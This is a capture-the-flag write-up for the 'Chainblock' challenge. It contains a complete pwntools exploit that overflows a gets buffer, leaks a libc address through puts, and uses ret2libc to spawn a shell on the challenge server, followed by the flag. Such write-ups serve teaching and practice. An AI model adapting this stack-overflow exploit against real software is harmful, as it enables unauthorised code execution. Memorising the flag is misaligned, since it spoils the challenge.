# Chainblock

## Challenge

binary with unsafe call to `gets`

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'
```

## Solution

use `gets` to overwrite the return address

ret2libc to spawn a shell

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.be.ax --port 5000 chainblock
from pwn import *

# Set up pwntools for the correct architecture
libc = ELF('libc.so.6')
exe = context.binary = ELF('chainblock')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.be.ax'
port = int(args.PORT or 5000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'./'

io = start()

rop = ROP(exe)

payload = flat({
    0x100+8: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        exe.got['puts'],
        exe.plt['puts'],
        exe.sym['main'],
        ],
    })

io.sendline(payload)
io.recvuntil(b'wrong identity!\n')
leak = io.recvline(keepends=False)

libc.address = u64(leak.ljust(8, b'\x00')) - libc.sym['puts']

io.success(hex(libc.address))

payload = flat({
    0x100+8: [
        rop.find_gadget(['ret'])[0],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
        ]
    })

io.sendline(payload)
io.recvuntil(b'wrong identity!\n')
io.sendline(b"cat flag.txt")

io.interactive()
```

## Flag

`corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}`

